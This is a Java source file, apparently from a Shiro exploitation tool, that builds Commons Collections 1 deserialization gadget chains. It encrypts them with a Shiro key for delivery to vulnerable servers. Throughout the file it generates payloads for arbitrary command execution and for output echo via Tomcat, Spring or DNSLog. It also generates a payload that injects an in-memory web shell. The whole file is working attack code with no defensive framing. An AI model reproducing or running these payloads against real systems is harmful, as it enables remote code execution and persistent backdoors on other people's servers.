package com.y5neko.shiroexp.gadget;

import com.y5neko.shiroexp.echo.*;
import com.y5neko.shiroexp.payloads.MemshellLoader;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.y5neko.shiroexp.misc.Tools;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1 {

    /**
     * 反射设置字段值
     */
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    /**
     * 生成命令执行payload（原有功能）
     */
    public static byte[] genPayload(String cmd) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        // 提取执行命令
        String[] cmd_array = cmd.split(" ");
        // 制作反射执行exec的chainedTransformer
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{cmd_array})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        //创建一个TransformedMap对象，并与chainedTransformer绑定
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","test value");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

        //反射获取AnnotationInvocationHandler类，并通过构造方法实例化对象
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object object = constructor.newInstance(Target.class, transformedMap);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(object);
        oos.close();
        return baos.toByteArray();
    }

    /**
     * 生成回显payload
     * @param echoType 回显类型
     * @param key Shiro Key
     * @return 加密后的payload字符串
     */
    public static String genEchoPayload(String echoType, String key) throws Exception {
        return genEchoPayload(echoType, key, "CBC");
    }

    /**
     * 生成回显payload（支持指定加密模式）
     * @param echoType 回显类型
     * @param key Shiro Key
     * @param cryptType 加密模式（"CBC" 或 "GCM"）
     * @return 加密后的payload字符串
     */
    public static String genEchoPayload(String echoType, String key, String cryptType) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass;
        CtClass superClass;

        if (echoType.equals("TomcatEcho")) {
            TomcatEcho tomcatEcho = new TomcatEcho();
            ctClass = tomcatEcho.genPayload(pool);

            if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
                superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            } else {
                superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            }
            ctClass.setSuperclass(superClass);

            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_bytecodes", new byte[][]{ctClass.toBytecode()});
            setFieldValue(templates, "_name", "a");
            setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(templates),
                    new InvokerTransformer("newTransformer", new Class[0], new Object[0]),
                    new ConstantTransformer(1)
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

            HashMap<Object, Object> innerMap = new HashMap<Object, Object>();
            innerMap.put("value", "value");
            Map<Object, Object> transformedMap = TransformedMap.decorate(innerMap, null, chainedTransformer);

            Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
            constructor.setAccessible(true);
            Object object = constructor.newInstance(Target.class, transformedMap);

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(object);
            oos.close();

            String data = Base64.getEncoder().encodeToString(baos.toByteArray());
            return Tools.encryptByType(key, data, cryptType);

        } else if (echoType.equals("SpringEcho")) {
            SpringEcho springEcho = new SpringEcho();
            ctClass = springEcho.genPayload(pool);

            if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
                superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            } else {
                superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            }
            ctClass.setSuperclass(superClass);

            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_bytecodes", new byte[][]{ctClass.toBytecode()});
            setFieldValue(templates, "_name", "a");
            setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(templates),
                    new InvokerTransformer("newTransformer", new Class[0], new Object[0]),
                    new ConstantTransformer(1)
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

            HashMap<Object, Object> innerMap = new HashMap<Object, Object>();
            innerMap.put("value", "value");
            Map<Object, Object> transformedMap = TransformedMap.decorate(innerMap, null, chainedTransformer);

            Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
            constructor.setAccessible(true);
            Object object = constructor.newInstance(Target.class, transformedMap);

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(object);
            oos.close();

            String data = Base64.getEncoder().encodeToString(baos.toByteArray());
            return Tools.encryptByType(key, data, cryptType);

        } else if (echoType.equals("AllEcho")) {
            AllEcho allEcho = new AllEcho();
            ctClass = allEcho.genPayload(pool);

            if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
                superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            } else {
                superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            }
            ctClass.setSuperclass(superClass);

            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_bytecodes", new byte[][]{ctClass.toBytecode()});
            setFieldValue(templates, "_name", "a");
            setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(templates),
                    new InvokerTransformer("newTransformer", new Class[0], new Object[0]),
                    new ConstantTransformer(1)
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

            HashMap<Object, Object> innerMap = new HashMap<Object, Object>();
            innerMap.put("value", "value");
            Map<Object, Object> transformedMap = TransformedMap.decorate(innerMap, null, chainedTransformer);

            Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
            constructor.setAccessible(true);
            Object object = constructor.newInstance(Target.class, transformedMap);

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(object);
            oos.close();

            String data = Base64.getEncoder().encodeToString(baos.toByteArray());
            return Tools.encryptByType(key, data, cryptType);

        } else if (echoType.equals("DNSLogEcho")) {
            // DNSLog 探测
            DNSLogEcho dnsLogEcho = new DNSLogEcho();
            ctClass = dnsLogEcho.genPayload(pool);

            if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
                superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            } else {
                superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            }
            ctClass.setSuperclass(superClass);

            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_bytecodes", new byte[][]{ctClass.toBytecode()});
            setFieldValue(templates, "_name", "a");
            setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(templates),
                    new InvokerTransformer("newTransformer", new Class[0], new Object[0]),
                    new ConstantTransformer(1)
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

            HashMap<Object, Object> innerMap = new HashMap<Object, Object>();
            innerMap.put("value", "value");
            Map<Object, Object> transformedMap = TransformedMap.decorate(innerMap, null, chainedTransformer);

            Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
            constructor.setAccessible(true);
            Object object = constructor.newInstance(Target.class, transformedMap);

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(object);
            oos.close();

            String data = Base64.getEncoder().encodeToString(baos.toByteArray());
            return Tools.encryptByType(key, data, cryptType);

        } else {
            throw new Exception("不支持的回显类型: " + echoType);
        }
    }

    /**
     * 生成内存马payload
     * @param key Shiro Key
     * @return 加密后的payload字符串
     */
    public static String genMemPayload(String key) throws Exception {
        return genMemPayload(key, "CBC");
    }

    /**
     * 生成内存马payload（支持指定加密模式）
     * @param key Shiro Key
     * @param cryptType 加密模式（"CBC" 或 "GCM"）
     * @return 加密后的payload字符串
     */
    public static String genMemPayload(String key, String cryptType) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass;
        CtClass superClass;

        // 使用 MemshellLoader 作为内存马注入器
        MemshellLoader memshellLoader = new MemshellLoader();
        ctClass = memshellLoader.genPayload(pool);

        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
            superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
        } else {
            superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        }
        ctClass.setSuperclass(superClass);

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{ctClass.toBytecode()});
        setFieldValue(templates, "_name", "a");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer", new Class[0], new Object[0]),
                new ConstantTransformer(1)
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> innerMap = new HashMap<Object, Object>();
        innerMap.put("value", "value");
        Map<Object, Object> transformedMap = TransformedMap.decorate(innerMap, null, chainedTransformer);

        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object object = constructor.newInstance(Target.class, transformedMap);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(object);
        oos.close();

        String data = Base64.getEncoder().encodeToString(baos.toByteArray());
        return Tools.encryptByType(key, data, cryptType);
    }
}
